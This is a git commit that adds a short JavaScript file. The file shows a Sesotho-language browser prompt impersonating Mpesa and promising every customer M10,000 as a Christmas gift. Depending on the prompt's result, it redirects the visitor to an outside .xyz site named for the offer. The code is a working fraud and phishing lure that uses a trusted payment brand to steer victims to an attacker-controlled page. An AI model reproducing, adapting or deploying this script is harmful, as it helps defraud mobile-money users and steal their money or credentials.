fe6185b62084682680093a5c164300b5c9e35584
newetijazz8 <newetijazz8@gmail.com>
2025-12-03 08:22:42 +0100

    Create lesothoxmas.js

---
+++ lesothoxmas.js
@@ -0,0 +1,5 @@
+var password = 'Tlosa M10000'
+password=prompt('Mpesa: Re fana ka M10,000 ho bareki bohle ba rona ho keteka Keresemese selemong sena, tobetsa OK ho fumana mpho ena e makatsang.','Tlosa M10000');
+if (password != 'Tlosa M10000') {
+location.href='https://www.itinpty.xyz/mpesa-m10000';
+}
